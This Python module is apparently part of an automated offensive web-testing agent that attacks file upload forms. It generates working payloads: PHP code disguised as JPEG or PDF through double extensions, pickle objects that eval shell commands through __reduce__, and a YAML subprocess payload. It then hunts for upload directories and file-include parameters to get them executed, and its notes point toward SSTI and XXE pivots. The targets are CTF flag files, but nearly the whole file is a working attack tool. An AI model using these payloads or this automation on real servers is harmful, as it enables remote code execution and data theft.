from __future__ import annotations

import json
import pickle
import re
import secrets
from html.parser import HTMLParser
from typing import cast
from urllib.parse import quote, urljoin, urlsplit

from ravage.agent_core.agent_state import AgentState
from ravage.web_core.http_probe import (
    ProbeResponse,
    ProbeSession,
    form_defaults,
)
from ravage.web_core.proof_recognizer import recognize_proofs

def _probe_upload_readbacks(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    forms = _upload_forms(state)
    if not forms and budget > 0:
        discovered_forms, discovery_requests, budget = _discover_upload_forms(session, state, budget=budget)
        requests.extend(discovery_requests)
        forms = discovered_forms
    for form in forms[:4]:
        if budget <= 0:
            break
        file_field = _file_input_name(form)
        if not file_field:
            continue
        for upload in _upload_attempts(state=state, form=form):
            if budget <= 0:
                break
            response = _submit_multipart_upload(session, form, file_field=file_field, upload=upload)
            budget -= 1
            requests.append(
                response.summary(body_chars=420)
                | {
                    "probe_kind": "file_upload",
                    "form": _upload_form_brief(form),
                    "file_field": file_field,
                    "filename": upload["filename"],
                    "content_type": upload["content_type"],
                }
            )
            finding = _upload_response_finding(form=form, file_field=file_field, upload=upload, response=response)
            if finding:
                findings.append(finding)
                if finding.get("proofs"):
                    return findings, requests, budget
            post_effect, post_effect_requests, budget = _probe_upload_post_effect(
                session,
                form=form,
                upload=upload,
                upload_response=response,
                budget=budget,
            )
            requests.extend(post_effect_requests)
            if post_effect:
                findings.append(post_effect)
                if post_effect.get("proofs"):
                    return findings, requests, budget
            if not response.ok and not finding:
                continue
            readback, readback_requests, budget = _probe_uploaded_file_readback(
                session,
                form=form,
                upload=upload,
                upload_response=response,
                budget=budget,
            )
            requests.extend(readback_requests)
            if readback:
                findings.append(readback)
                if readback.get("proofs"):
                    return findings, requests, budget
    return findings, requests, budget


def _upload_forms(state: AgentState) -> list[dict[str, object]]:
    forms: list[dict[str, object]] = []
    for form in _form_targets(state, limit=16):
        if _file_input_name(form):
            forms.append(form)
            continue
        text = json.dumps(form, sort_keys=True).lower()
        if "multipart/form-data" in text or "upload" in text:
            forms.append(form)
    return forms


def _upload_evidence_present(state: AgentState) -> bool:
    try:
        text = json.dumps(
            {
                "surface": state.surface,
                "signals": {
                    key: values
                    for key, values in state.signals.items()
                    if key in {"forms", "endpoints", "links", "markers", "parameters"}
                },
                "facts": state.facts[-20:],
            },
            sort_keys=True,
        ).lower()
    except (TypeError, ValueError):
        text = " ".join(state.facts[-20:]).lower()
    return any(marker in text for marker in ("multipart/form-data", '"type": "file"', "file_fields", "upload"))


def _targets_suggest_upload(targets: list[dict[str, object]]) -> bool:
    for target in targets[:8]:
        text = " ".join(
            [
                str(target.get("input") or ""),
                str(target.get("name") or ""),
                str(target.get("url") or ""),
                " ".join(_string_items(target.get("hints"))),
            ]
        ).lower()
        if any(marker in text for marker in ("upload", "userfile", "file_field", "multipart")):
            return True
    return False


def _discover_upload_forms(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    forms: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    for url in _upload_form_discovery_urls(session, state):
        if budget <= 0:
            break
        response = session.get(url)
        budget -= 1
        discovered = _parse_upload_forms(response.body, response.final_url or response.url)
        requests.append(
            response.summary(body_chars=420)
            | {
                "probe_kind": "file_upload_form_discovery",
                "forms_found": len(discovered),
            }
        )
        forms.extend(discovered)
        if forms:
            break
    return _dedupe_upload_forms(forms), requests, budget


def _upload_form_discovery_urls(session: ProbeSession, state: AgentState) -> list[str]:
    urls = [
        str(state.surface.get("target_url") or ""),
        session.target_url,
        session.absolute("/"),
        session.absolute("/index.php"),
        session.absolute("/upload"),
        session.absolute("/upload.php"),
    ]
    for page in _list_of_dicts(state.surface.get("pages")):
        urls.append(str(page.get("url") or ""))
    return _dedupe([session.absolute(url) for url in urls if url])[:8]


def _parse_upload_forms(body: str, base_url: str) -> list[dict[str, object]]:
    parser = _UploadFormHTMLParser(base_url)
    try:
        parser.feed(body)
        parser.close()
    except Exception:
        return []
    return [form for form in parser.forms if _file_input_name(form)]


def _dedupe_upload_forms(forms: list[dict[str, object]]) -> list[dict[str, object]]:
    deduped: dict[tuple[str, str, str], dict[str, object]] = {}
    for form in forms:
        key = (
            str(form.get("method") or "GET").upper(),
            str(form.get("action") or ""),
            json.dumps(form.get("inputs") or [], sort_keys=True),
        )
        if key not in deduped:
            deduped[key] = form
    return list(deduped.values())


class _UploadFormHTMLParser(HTMLParser):
    def __init__(self, base_url: str) -> None:
        super().__init__(convert_charrefs=True)
        self.base_url = base_url
        self.forms: list[dict[str, object]] = []
        self._current: dict[str, object] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attrs_dict = {name.lower(): (value or "") for name, value in attrs}
        if tag.lower() == "form":
            action = attrs_dict.get("action", "")
            self._current = {
                "action": urljoin(self.base_url, action) if action else self.base_url,
                "method": (attrs_dict.get("method") or "GET").upper(),
                "enctype": attrs_dict.get("enctype", ""),
                "inputs": [],
                "file_fields": [],
                "categories": ["upload", "file"],
            }
            return
        if tag.lower() != "input" or self._current is None:
            return
        input_type = (attrs_dict.get("type") or "text").lower()
        name = attrs_dict.get("name", "")
        if not name:
            return
        input_item = {
            "name": name,
            "type": input_type,
            "value": attrs_dict.get("value", ""),
            "required": "required" in attrs_dict,
            "disabled": "disabled" in attrs_dict,
        }
        cast(list[dict[str, object]], self._current.setdefault("inputs", [])).append(input_item)
        if input_type == "file":
            cast(list[str], self._current.setdefault("file_fields", [])).append(name)

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() != "form" or self._current is None:
            return
        self.forms.append(self._current)
        self._current = None


def _file_input_name(form: dict[str, object]) -> str:
    for input_field in _list_of_dicts(form.get("inputs")):
        name = str(input_field.get("name") or "")
        input_type = str(input_field.get("type") or "").lower()
        if name and input_type == "file":
            return name
    for name in _string_items(form.get("file_fields")):
        if name:
            return name
    return ""


def _upload_attempts(*, state: AgentState | None = None, form: dict[str, object] | None = None) -> list[dict[str, object]]:
    token = "RAVAGE_UPLOAD_" + secrets.token_hex(6)
    pickle_marker = pickle.dumps({"ravage_pickle_probe": token}, protocol=4)
    pickle_proof = _pickle_eval_payload(token)
    pickle_decoy_unlock = _pickle_decoy_unlock_payload(token)
    yaml_marker = f"ravage_yaml_probe: {token}\n".encode("utf-8")
    yaml_proof = _yaml_eval_payload(token)
    flag_paths = (
        "/FLAG.txt",
        "/flag",
        "/flag.txt",
        "/tmp/FLAG.txt",
        "/tmp/flag",
        "/tmp/flag.txt",
        "/app/FLAG.txt",
        "/app/flag",
        "/app/flag.txt",
        "/var/www/html/FLAG.txt",
        "/var/www/html/flag",
        "/var/www/html/flag.txt",
    )
    php_path_array = ",".join(json.dumps(path) for path in flag_paths)
    php = (
        f"<?php echo {json.dumps(token + chr(10))}; "
        "foreach(array('FLAG','flag','CTF_FLAG','CHALLENGE_FLAG') as $k){$v=getenv($k); if($v) echo \"\\n\".$v;} "
        f"foreach(array({php_path_array}) as $p){{if(is_readable($p)) echo \"\\n\".@file_get_contents($p);}} ?>"
    )
    jpg = _minimal_jpeg(token)
    pdf_php = b"%PDF-1.3\n% ravage upload probe\n" + php.encode("utf-8")
    attempts = [
        {
            "filename": f"ravage_{token.lower()}.php",
            "content_type": "application/x-php",
            "body": php.encode("utf-8"),
            "token": token,
        },
        {
            "filename": f"ravage_{token.lower()}.pdf.php",
            "content_type": "application/pdf",
            "body": pdf_php,
            "token": token,
        },
        {
            "filename": f"ravage_{token.lower()}.pkl",
            "content_type": "application/octet-stream",
            "body": pickle_marker,
            "token": token,
        },
        {
            "filename": f"ravage_{token.lower()}_proof.pkl",
            "content_type": "application/octet-stream",
            "body": pickle_proof,
            "token": token,
        },
        {
            "filename": f"ravage_{token.lower()}_decoy_unlock.pkl",
            "content_type": "application/octet-stream",
            "body": pickle_decoy_unlock,
            "token": token,
            "post_check": True,
            "side_effect": "pickle_remove_decoy_then_read_real_flag",
        },
        {
            "filename": f"ravage_{token.lower()}.yaml",
            "content_type": "application/x-yaml",
            "body": yaml_marker,
            "token": token,
        },
        {
            "filename": f"ravage_{token.lower()}_proof.yaml",
            "content_type": "application/x-yaml",
            "body": yaml_proof,
            "token": token,
        },
        {
            "filename": f"ravage_{token.lower()}.jpg",
            "content_type": "image/jpeg",
            "body": jpg,
            "token": token,
        },
        {
            "filename": f"ravage_{token.lower()}.php.jpg",
            "content_type": "image/jpeg",
            "body": jpg + php.encode("utf-8"),
            "token": token,
        },
        {
            "filename": f"ravage_{token.lower()}.jpg.php",
            "content_type": "image/jpeg",
            "body": jpg + php.encode("utf-8"),
            "token": token,
        },
        {
            "filename": f"ravage_{token.lower()}.phtml",
            "content_type": "application/x-php",
            "body": php.encode("utf-8"),
            "token": token,
        },
    ]
    if _upload_context_looks_image(state=state, form=form):
        priority = (".jpg.php", ".php.jpg", ".jpg", ".jpeg.php", ".php.jpeg", ".jpeg")
        return sorted(attempts, key=lambda item: _upload_attempt_priority(str(item["filename"]), priority))
    if _upload_context_looks_pdf(state=state, form=form):
        priority = (".pdf.php", ".pdf", ".php")
        return sorted(attempts, key=lambda item: _upload_attempt_priority(str(item["filename"]), priority))
    if _upload_context_looks_pickle(state=state, form=form):
        priority = ("_decoy_unlock.pkl", "_proof.pkl", ".pkl", ".yaml", "_proof.yaml")
        return sorted(attempts, key=lambda item: _upload_attempt_priority(str(item["filename"]), priority))
    return attempts


def _upload_context_looks_image(*, state: AgentState | None, form: dict[str, object] | None) -> bool:
    fragments: list[object] = [form or {}]
    if state is not None:
        fragments.append(state.surface.get("pages"))
        fragments.append(state.surface.get("forms"))
        fragments.append(state.signals)
    text = json.dumps(fragments, sort_keys=True, default=str).lower()
    return any(marker in text for marker in ("image", "jpg", "jpeg", "photo", "picture", "avatar"))


def _upload_context_looks_pdf(*, state: AgentState | None, form: dict[str, object] | None) -> bool:
    fragments: list[object] = [form or {}]
    if state is not None:
        fragments.append(state.surface.get("pages"))
        fragments.append(state.surface.get("forms"))
        fragments.append(state.signals)
    text = json.dumps(fragments, sort_keys=True, default=str).lower()
    return any(marker in text for marker in ("pdf", "invoice", "resume", "cv"))


def _upload_context_looks_pickle(*, state: AgentState | None, form: dict[str, object] | None) -> bool:
    fragments: list[object] = [form or {}]
    if state is not None:
        fragments.append(state.surface.get("visible_description"))
        fragments.append(state.surface.get("pages"))
        fragments.append(state.surface.get("forms"))
        fragments.append(state.signals)
        fragments.append(state.facts[-20:])
    text = json.dumps(fragments, sort_keys=True, default=str).lower()
    return any(marker in text for marker in ("pickle", ".pkl", "deserial", "serialized"))


def _upload_attempt_priority(filename: str, priority_suffixes: tuple[str, ...]) -> int:
    lowered = filename.lower()
    for index, suffix in enumerate(priority_suffixes):
        if lowered.endswith(suffix):
            return index
    return len(priority_suffixes)


class _PickleEvalPayload:
    def __init__(self, expression: str) -> None:
        self.expression = expression

    def __reduce__(self) -> tuple[object, tuple[str]]:
        return (eval, (self.expression,))


def _pickle_eval_payload(token: str) -> bytes:
    flag_paths = " ".join(
        (
            "/FLAG.txt",
            "/flag",
            "/flag.txt",
            "/tmp/FLAG.txt",
            "/tmp/flag",
            "/tmp/flag.txt",
            "/app/FLAG.txt",
            "/app/flag",
            "/app/flag.txt",
            "/var/www/html/FLAG.txt",
            "/var/www/html/flag",
            "/var/www/html/flag.txt",
        )
    )
    expression = f"__import__('os').popen('cat {flag_paths} 2>/dev/null').read() or {token!r}"
    return pickle.dumps(_PickleEvalPayload(expression), protocol=4)


def _pickle_decoy_unlock_payload(token: str) -> bytes:
    expression = (
        "(__import__('os').path.exists('decoy.txt') "
        "and __import__('os').remove('decoy.txt')) "
        f"or {token!r}"
    )
    return pickle.dumps(_PickleEvalPayload(expression), protocol=4)


def _yaml_eval_payload(token: str) -> bytes:
    command = (
        "cat /FLAG.txt /flag /flag.txt /tmp/FLAG.txt /tmp/flag /tmp/flag.txt "
        "/app/FLAG.txt /app/flag /app/flag.txt /var/www/html/FLAG.txt "
        f"/var/www/html/flag /var/www/html/flag.txt 2>/dev/null || printf {token!r}"
    )
    return (
        "!!python/object/apply:subprocess.check_output\n"
        "- [\"sh\", \"-c\", " + json.dumps(command) + "]\n"
    ).encode("utf-8")


def _minimal_jpeg(comment: str) -> bytes:
    payload = comment.encode("utf-8", errors="replace")
    return b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + payload + b"\xff\xd9"


def _submit_multipart_upload(
    session: ProbeSession,
    form: dict[str, object],
    *,
    file_field: str,
    upload: dict[str, object],
) -> ProbeResponse:
    action = str(form.get("action") or session.target_url)
    fields = form_defaults(form)
    if not _has_explicit_submit_control(form):
        fields.pop("submit", None)
    boundary = "----RavageUpload" + secrets.token_hex(8)
    body = _multipart_body(
        boundary=boundary,
        fields=fields,
        file_field=file_field,
        filename=str(upload["filename"]),
        content_type=str(upload["content_type"]),
        file_body=cast(bytes, upload["body"]),
    )
    headers = _form_auth_headers(form)
    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    return session.request("POST", action, data=body, headers=headers)


def _has_explicit_submit_control(form: dict[str, object]) -> bool:
    for input_field in _list_of_dicts(form.get("inputs")):
        input_type = str(input_field.get("type") or "").lower()
        name = str(input_field.get("name") or "").lower()
        if input_type in {"submit", "button"} or name == "submit":
            return True
    return False


def _multipart_body(
    *,
    boundary: str,
    fields: dict[str, str],
    file_field: str,
    filename: str,
    content_type: str,
    file_body: bytes,
) -> bytes:
    chunks: list[bytes] = []
    for name, value in fields.items():
        if name == file_field:
            continue
        chunks.append(f"--{boundary}\r\n".encode("ascii"))
        chunks.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode("utf-8"))
        chunks.append(value.encode("utf-8", errors="replace") + b"\r\n")
    chunks.append(f"--{boundary}\r\n".encode("ascii"))
    chunks.append(
        (
            f'Content-Disposition: form-data; name="{file_field}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
        ).encode("utf-8")
    )
    chunks.append(file_body + b"\r\n")
    chunks.append(f"--{boundary}--\r\n".encode("ascii"))
    return b"".join(chunks)


def _upload_response_finding(
    *,
    form: dict[str, object],
    file_field: str,
    upload: dict[str, object],
    response: ProbeResponse,
) -> dict[str, object] | None:
    token = str(upload["token"])
    proofs = recognize_proofs(response.body)
    if proofs:
        finding_type = "file_upload_extracted_proof"
    elif token in response.body:
        finding_type = "file_upload_sink_reachable"
    elif _upload_response_has_path(response.body, str(upload["filename"])):
        finding_type = "file_upload_saved_path"
    else:
        return None
    return {
        "type": finding_type,
        "form": _upload_form_brief(form),
        "file_field": file_field,
        "filename": upload["filename"],
        "proofs": proofs,
        "is_proof": bool(proofs),
        "marker": token if not proofs and token in response.body else "",
        "response": response.summary(body_chars=700),
        "next": (
            "Use the recorded filename/path for bounded readback at a served path "
            "(e.g. /static/images/<file>). A reflected RAVAGE marker or saved path is reachability "
            "evidence, not proof: pivot to a payload the server interprets (SSTI/XXE/PHP) reached "
            "through a render/include endpoint rather than re-capturing the canary."
        ),
    }


def _probe_upload_post_effect(
    session: ProbeSession,
    *,
    form: dict[str, object],
    upload: dict[str, object],
    upload_response: ProbeResponse,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    if not upload.get("post_check"):
        return None, [], budget
    requests: list[dict[str, object]] = []
    for url in _upload_post_effect_urls(session, form, upload_response):
        if budget <= 0:
            break
        response = session.get(url, headers=_optional_headers(_form_auth_headers(form)))
        budget -= 1
        requests.append(
            response.summary(body_chars=520)
            | {
                "probe_kind": "file_upload_post_effect_check",
                "filename": upload["filename"],
                "side_effect": upload.get("side_effect", ""),
            }
        )
        proofs = recognize_proofs(response.body)
        if not proofs:
            continue
        return (
            {
                "type": "file_upload_deserialization_side_effect_proof",
                "form": _upload_form_brief(form),
                "filename": upload["filename"],
                "side_effect": upload.get("side_effect", ""),
                "proofs": proofs,
                "response": response.summary(body_chars=900),
                "replay": {"method": "GET", "url": response.url},
                "next": (
                    "The upload body was interpreted server-side and a bounded state-change probe "
                    "made a proof reachable on a follow-up page."
                ),
            },
            requests,
            budget,
        )
    return None, requests, budget


def _upload_post_effect_urls(
    session: ProbeSession,
    form: dict[str, object],
    upload_response: ProbeResponse,
) -> list[str]:
    action = str(form.get("action") or session.target_url)
    location = str(upload_response.headers.get("location") or upload_response.headers.get("Location") or "")
    return _dedupe(
        [
            session.absolute(location) if location else "",
            session.absolute(action),
            session.target_url,
            session.absolute("/"),
        ]
    )[:4]


def _probe_uploaded_file_readback(
    session: ProbeSession,
    *,
    form: dict[str, object],
    upload: dict[str, object],
    upload_response: ProbeResponse,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    sink_reachable: dict[str, object] | None = None
    for url in _uploaded_file_candidates(session, form, upload, upload_response):
        if budget <= 0:
            break
        response = session.get(url, headers=_optional_headers(_form_auth_headers(form)))
        budget -= 1
        filename = str(upload["filename"])
        requests.append(
            response.summary(body_chars=520)
            | {
                "probe_kind": "file_upload_readback",
                "filename": filename,
            }
        )
        token = str(upload["token"])
        proofs = recognize_proofs(response.body)
        if proofs:
            return (
                {
                    "type": "file_upload_extracted_proof",
                    "filename": filename,
                    "url": response.url,
                    "proofs": proofs,
                    "response": response.summary(body_chars=900),
                    "replay": {"method": "GET", "url": response.url},
                },
                requests,
                budget,
            )
        if token in response.body:
            # The served file echoes back the marker RAVAGE planted. That only
            # proves a file-write + static-read-back primitive (reachability),
            # not the target proof, so this is reported as sink evidence with an
            # explicit pivot rather than anything that looks terminal -- the
            # agent must not burn turns re-capturing its own canary.
            sink_reachable = sink_reachable or _upload_sink_reachable_finding(
                filename=filename,
                response=response,
                token=token,
            )
            if _upload_filename_looks_interpretable(filename):
                continue
            return sink_reachable, requests, budget
    return sink_reachable, requests, budget


def _upload_sink_reachable_finding(
    *,
    filename: str,
    response: ProbeResponse,
    token: str,
) -> dict[str, object]:
    return {
        "type": "file_upload_sink_reachable",
        "is_proof": False,
        "filename": filename,
        "url": response.url,
        "proofs": [],
        "marker": token,
        "evidence": "uploaded file is stored and served back verbatim (arbitrary file write + read)",
        "response": response.summary(body_chars=600),
        "replay": {"method": "GET", "url": response.url},
        "next": (
            "Reachability only -- this is RAVAGE's own canary, never the flag, so stop "
            "re-fetching it. Pivot to execution/extraction: (1) upload content the server "
            "interprets (a template/.html with {{7*7}}-style SSTI, an .svg/.xml carrying an "
            "external entity, or .php/.phtml on PHP stacks) and reach it through the "
            "render/include endpoint instead of the static path; or (2) feed this stored "
            "path into a known include/template/render/page parameter so the file is parsed."
        ),
    }


def _uploaded_file_candidates(
    session: ProbeSession,
    form: dict[str, object],
    upload: dict[str, object],
    response: ProbeResponse,
) -> list[str]:
    filename = str(upload["filename"])
    candidates = _paths_from_upload_response(response.body, filename)
    directories = _upload_directories(form)
    for directory in directories[:6]:
        candidates.append(directory.rstrip("/") + "/" + filename)
    candidates.extend(_uploaded_include_candidates(form, filename))
    for directory in directories[6:]:
        candidates.append(directory.rstrip("/") + "/" + filename)
    limit = 18 if _upload_filename_looks_interpretable(filename) else 10
    return _dedupe([session.absolute(candidate) for candidate in candidates])[:limit]


def _paths_from_upload_response(body: str, filename: str) -> list[str]:
    paths: list[str] = []
    escaped = re.escape(filename)
    patterns = [
        rf"""(?:href|src)=["']([^"']*{escaped})["']""",
        rf"""((?:/|uploads?/|files?/|images?/)[A-Za-z0-9_./-]*{escaped})""",
    ]
    for pattern in patterns:
        for match in re.finditer(pattern, body, flags=re.IGNORECASE):
            paths.append(match.group(1))
    return paths


def _upload_directories(form: dict[str, object]) -> list[str]:
    action = str(form.get("action") or "/")
    action_path = urlsplit(action).path or "/"
    base_dir = action_path.rsplit("/", 1)[0] or "/"
    base = base_dir.rstrip("/")
    base_prefixes = [
        _join_url_path(base, "uploads"),
        _join_url_path(base, "upload"),
        _join_url_path(base, "files"),
        _join_url_path(base, "images"),
        _join_url_path(base, "static/images"),
    ]
    # Action-relative upload paths are most likely when a PHP form handler uses
    # a relative target directory such as "uploads/". Keep framework/static
    # defaults close behind for Flask/Django-style served assets.
    return _dedupe(
        base_prefixes
        + [
            "/uploads",
            "/upload",
            "/files",
            "/images",
            "/img",
            "/media",
            "/media/uploads",
            "/static/images",
            "/static/img",
            "/static/uploads",
            "/static/files",
            "/static",
            "/uploaded_invoices",
            "/assets/uploads",
            "/public/uploads",
            base + "/uploaded_invoices",
        ]
    )


def _join_url_path(base: str, suffix: str) -> str:
    prefix = base.rstrip("/")
    return "/" + suffix.lstrip("/") if not prefix else prefix + "/" + suffix.lstrip("/")


def _uploaded_include_candidates(form: dict[str, object], filename: str) -> list[str]:
    if not _upload_filename_looks_interpretable(filename):
        return []
    refs = _uploaded_include_refs(form, filename)
    entrypoints = _include_entrypoints_near_upload_form(form)
    params = ("id", "file", "page", "path", "include", "view", "template")
    candidates: list[str] = []
    for entrypoint in entrypoints:
        for ref in refs:
            for param in params:
                candidates.append(f"{entrypoint}?{param}={quote(ref, safe='/._-')}")
                if len(candidates) >= 24:
                    return candidates
    return candidates


def _uploaded_include_refs(form: dict[str, object], filename: str) -> list[str]:
    stems: list[str] = []
    lowered = filename.lower()
    for suffix in (".php", ".phtml", ".php5", ".phar"):
        if lowered.endswith(suffix):
            stems.append(filename[: -len(suffix)])
            break
    stems.append(filename)
    refs: list[str] = []
    for stem in stems:
        refs.extend(
            [
                stem,
                "uploads/" + stem,
                "upload/" + stem,
                "files/" + stem,
                "posts/uploads/" + stem,
            ]
        )
    return _dedupe(refs)


def _include_entrypoints_near_upload_form(form: dict[str, object]) -> list[str]:
    action = str(form.get("action") or "/")
    action_path = urlsplit(action).path or "/"
    base_dir = action_path.rsplit("/", 1)[0] or "/"
    base = base_dir.rstrip("/")
    return _dedupe(
        [
            "/post.php",
            "/index.php",
            "/view.php",
            "/page.php",
            "/include.php",
            _join_url_path(base, "post.php"),
            _join_url_path(base, "index.php"),
            _join_url_path(base, "view.php"),
        ]
    )


def _upload_filename_looks_interpretable(filename: str) -> bool:
    lowered = filename.lower()
    return lowered.endswith((".php", ".phtml", ".php5", ".phar"))


def _upload_response_has_path(body: str, filename: str) -> bool:
    lowered = body.lower()
    return filename.lower() in lowered and any(marker in lowered for marker in ("upload", "saved", "file", "href", "src"))


def _upload_form_brief(form: dict[str, object]) -> dict[str, object]:
    return {
        "action": str(form.get("action") or ""),
        "method": str(form.get("method") or "GET").upper(),
        "enctype": str(form.get("enctype") or ""),
        "file_field": _file_input_name(form),
    }


def _form_targets(state: AgentState, *, limit: int) -> list[dict[str, object]]:
    forms = _list_of_dicts(state.surface.get("forms"))
    for value in state.signals.get("forms", []):
        try:
            decoded = json.loads(value)
        except json.JSONDecodeError:
            continue
        if isinstance(decoded, dict):
            forms.append(decoded)
    origin = str(state.surface.get("origin") or state.surface.get("target_url") or "")
    deduped: dict[tuple[str, str, str], dict[str, object]] = {}
    for form in forms:
        if not _url_in_scope(str(form.get("action") or ""), origin):
            continue
        key = (
            str(form.get("method") or "GET").upper(),
            str(form.get("action") or ""),
            json.dumps(form.get("inputs") or [], sort_keys=True),
        )
        if key not in deduped:
            deduped[key] = form
    return list(deduped.values())[:limit]


def _url_in_scope(url: str, origin: str) -> bool:
    if not url or not origin:
        return True
    try:
        url_parts = urlsplit(url)
        origin_parts = urlsplit(origin)
    except ValueError:
        return False
    if not url_parts.scheme and not url_parts.netloc:
        return True
    return (url_parts.scheme, url_parts.netloc) == (origin_parts.scheme, origin_parts.netloc)


def _form_auth_headers(form: dict[str, object]) -> dict[str, str]:
    raw = form.get("auth_headers")
    if not isinstance(raw, dict):
        return {}
    headers: dict[str, str] = {}
    for key, value in raw.items():
        name = str(key).strip()
        text = str(value).strip()
        if name and text:
            headers[name] = text
    return headers


def _optional_headers(headers: dict[str, str]) -> dict[str, str] | None:
    return headers or None


def _list_of_dicts(value: object) -> list[dict[str, object]]:
    if not isinstance(value, list):
        return []
    return [dict(item) for item in value if isinstance(item, dict)]


def _dict_value(value: object) -> dict[str, object]:
    if isinstance(value, dict):
        return cast(dict[str, object], value)
    return {}


def _string_items(value: object) -> list[str]:
    if not isinstance(value, list):
        return []
    return [str(item) for item in value if item]


def _dedupe(values: list[str]) -> list[str]:
    result: list[str] = []
    for value in values:
        if value and value not in result:
            result.append(value)
    return result
